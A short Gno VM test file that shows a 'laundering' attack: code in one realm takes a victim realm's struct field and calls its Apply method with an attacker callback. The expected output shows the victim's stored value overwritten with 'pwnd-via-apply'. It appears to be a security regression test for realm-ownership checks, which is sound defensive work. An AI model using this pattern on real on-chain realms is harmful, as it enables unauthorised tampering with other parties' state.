// PKGPATH: gno.land/r/launderrh_vf
package launderrh_vf

// /r/-declared victim with /p/-VALUE FIELD — Apply-callback attack.
//
// WithVal has `Inner launderpkg.Immutable` (named, not embedded).
// Attacker takes the address of the inner field, then calls Apply.
// Same exploit pattern as the embed/pointer variants.

import (
	"gno.land/p/demo/tests/launderattack"
	"gno.land/r/tests/vm/launderrvictim"
)

func main(cur realm) {
	println("before:", launderrvictim.ReadVal())

	wv := launderrvictim.GetWithVal()
	wv.Inner.Apply(launderattack.EvilWrite)

	println("after: ", launderrvictim.ReadVal())
}

// Output:
// before: val-orig
// after:  pwnd-via-apply
